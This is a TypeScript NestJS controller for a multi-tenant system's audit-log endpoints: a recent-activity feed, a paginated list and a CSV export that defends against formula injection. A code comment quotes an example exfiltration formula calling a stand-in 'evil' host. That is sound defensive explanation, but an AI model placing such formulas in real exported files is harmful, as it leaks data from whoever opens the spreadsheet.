import { Controller, Get, Query, Request, Res, UseGuards } from '@nestjs/common';
import type { Response } from 'express';
import { PrismaService } from '../prisma/prisma.service';
import { JwtAuthGuard } from '../auth/jwt-auth.guard';
import { RbacGuard } from '../auth/rbac.guard';
import { RequireRoles } from '../auth/roles.decorator';
import { AppRole } from '@cms/database';

const ADMIN_ROLES = [AppRole.SUPER_ADMIN, AppRole.DISTRICT_ADMIN, AppRole.SCHOOL_ADMIN] as const;

function parseDate(value: string | undefined): Date | undefined {
  if (!value) return undefined;
  const d = new Date(value);
  return Number.isNaN(d.getTime()) ? undefined : d;
}

function clampInt(value: string | undefined, def: number, min: number, max: number): number {
  if (!value) return def;
  const n = parseInt(value, 10);
  if (Number.isNaN(n)) return def;
  return Math.min(Math.max(n, min), max);
}

function csvEscape(v: unknown): string {
  if (v === null || v === undefined) return '';
  let s = String(v);
  // CSV formula-injection defense (2026-05-23 launch audit P1):
  // Excel / Numbers / LibreOffice / Google Sheets all interpret a
  // cell starting with `=`, `+`, `-`, `@`, TAB, or CR as a formula.
  // AuditLog `details` JSON can carry user-controlled strings (asset
  // names, playlist names, emails); without prefixing, an admin
  // double-clicking audit-2026-05-23.csv could trigger
  //   =HYPERLINK("https://evil/exfil?d=" & A1)
  // and exfiltrate data. Prefix with a tab so the formula doesn't
  // evaluate but the visible value is still readable. OWASP CSV
  // Injection cheatsheet, same defense Google Sheets uses on import.
  if (/^[=+\-@\t\r]/.test(s)) {
    s = `\t${s}`;
  }
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

@Controller('api/v1/audit')
@UseGuards(JwtAuthGuard, RbacGuard)
export class AuditController {
  constructor(private readonly prisma: PrismaService) {}

  @Get('recent')
  @RequireRoles(...ADMIN_ROLES)
  async getRecentActivity(@Request() req: any) {
    const tenantId = req.user.tenantId;
    // Hide high-frequency device-polling actions from the dashboard's
    // "Recent Activity" card — they were drowning the genuinely
    // interesting events (admin logged in, playlist created, emergency
    // triggered). Each paired screen re-fetches its emergency-asset
    // manifest every ~5 minutes, so 50 screens generate 600
    // 'DEVICE_FETCH_EMERGENCY_ASSETS' entries an hour; the operator
    // cares about none of them in normal operation. The full record
    // still lives in /audit (and /audit/export) for forensics.
    // 2026-08-31 — operator: "recent activity should be real user changes,
    // not every detail". Evidence from 48h of prod audit rows: the
    // credential lifecycle re-registers every screen on a timer, so
    // SCREEN_TOKEN_DOWNGRADED (252 rows) + RENEWED (90) drowned everything;
    // AUTO_* are the wedge detector's machine recoveries; logins and tenant
    // switches are sessions, not changes. All of it stays in /audit +
    // /audit/export for forensics — this list only shapes the dashboard card.
    const DEVICE_NOISE = [
      'DEVICE_FETCH_EMERGENCY_ASSETS',
      'SCREEN_TOKEN_RENEWED',
      'SCREEN_TOKEN_DOWNGRADED',
      'AUTO_REFRESH_WEB',
      'AUTO_RECOVERY_PUSH_DEAD',
      'AUTH_LOGIN_SUCCESS',
      'AUTH_LOGIN_FAILED',
      'TENANT_SWITCH',
      // Second sweep (2026-08-31 — operator: "this is not just user activity
      // in the list", 7-day prod census). These are MACHINE outcomes even
      // though several carry the user id of the request that spawned them:
      // alt-text generation is a background job, the branding scrape is a
      // fetch step (the ADOPT that follows IS the user's change and stays),
      // token refresh is session machinery, capabilities-changed is
      // device-reported, geocode backfill is the auto-heal cron.
      'AI_ALT_TEXT_GENERATED',
      'AI_ALT_TEXT_SKIPPED',
      'BRANDING_SCRAPE',
      'AUTH_TOKEN_REFRESH',
      'SCREEN_DISPLAY_CAPABILITIES_CHANGED',
      'GEOCODE_BACKFILL',
    ];
    return this.prisma.client.auditLog.findMany({
      where: { tenantId, action: { notIn: DEVICE_NOISE } },
      take: 20,
      orderBy: { createdAt: 'desc' },
      include: { user: { select: { email: true, role: true } } },
    });
  }

  @Get()
  @RequireRoles(...ADMIN_ROLES)
  async list(
    @Request() req: any,
    @Query('from') from?: string,
    @Query('to') to?: string,
    @Query('actorId') actorId?: string,
    @Query('action') action?: string,
    @Query('limit') limitStr?: string,
    @Query('offset') offsetStr?: string,
    // ACC-06 follow-up (2026-08-03) — "everything this key ever did". Declared
    // last so the existing positional call sites keep working.
    @Query('apiKeyId') apiKeyId?: string,
  ) {
    const tenantId = req.user.tenantId;
    const limit = clampInt(limitStr, 50, 1, 200);
    const offset = clampInt(offsetStr, 0, 0, 100000);

    const where = this.buildWhere(tenantId, { from, to, actorId, action, apiKeyId });

    const [items, total] = await Promise.all([
      this.prisma.client.auditLog.findMany({
        where,
        take: limit,
        skip: offset,
        orderBy: { createdAt: 'desc' },
        include: { user: { select: { email: true, role: true } } },
      }),
      this.prisma.client.auditLog.count({ where }),
    ]);

    return { items, total, limit, offset };
  }

  @Get('export')
  @RequireRoles(...ADMIN_ROLES)
  async exportCsv(
    @Request() req: any,
    @Res() res: Response,
    @Query('from') from?: string,
    @Query('to') to?: string,
    @Query('actorId') actorId?: string,
    @Query('action') action?: string,
    @Query('apiKeyId') apiKeyId?: string,
  ) {
    const tenantId = req.user.tenantId;
    const where = this.buildWhere(tenantId, { from, to, actorId, action, apiKeyId });

    // Hard cap to protect memory in case the caller omits filters.
    const items = await this.prisma.client.auditLog.findMany({
      where,
      take: 10000,
      orderBy: { createdAt: 'desc' },
      include: { user: { select: { email: true, role: true } } },
    });

    // `apiKeyId` is appended rather than slotted next to the actor columns so
    // an existing consumer parsing this CSV by position keeps working.
    const header = ['timestamp', 'actorEmail', 'actorRole', 'action', 'targetType', 'targetId', 'details', 'apiKeyId'];
    const lines = [header.join(',')];
    for (const row of items) {
      lines.push(
        [
          row.createdAt.toISOString(),
          row.user?.email ?? '',
          row.user?.role ?? '',
          row.action,
          row.targetType,
          row.targetId ?? '',
          row.details ?? '',
          row.apiKeyId ?? '',
        ]
          .map(csvEscape)
          .join(','),
      );
    }

    const csv = lines.join('\n');
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader(
      'Content-Disposition',
      `attachment; filename="audit-${new Date().toISOString().slice(0, 10)}.csv"`,
    );
    res.send(csv);
  }

  private buildWhere(
    tenantId: string,
    filters: { from?: string; to?: string; actorId?: string; action?: string; apiKeyId?: string },
  ) {
    const where: any = { tenantId };
    const fromDate = parseDate(filters.from);
    const toDate = parseDate(filters.to);
    if (fromDate || toDate) {
      where.createdAt = {};
      if (fromDate) where.createdAt.gte = fromDate;
      if (toDate) where.createdAt.lte = toDate;
    }
    if (filters.actorId) where.userId = filters.actorId;
    if (filters.action) where.action = filters.action;
    // Still scoped by tenantId above — a key id from another tenant simply
    // matches nothing rather than leaking that tenant's history.
    if (filters.apiKeyId) where.apiKeyId = filters.apiKeyId;
    return where;
  }
}
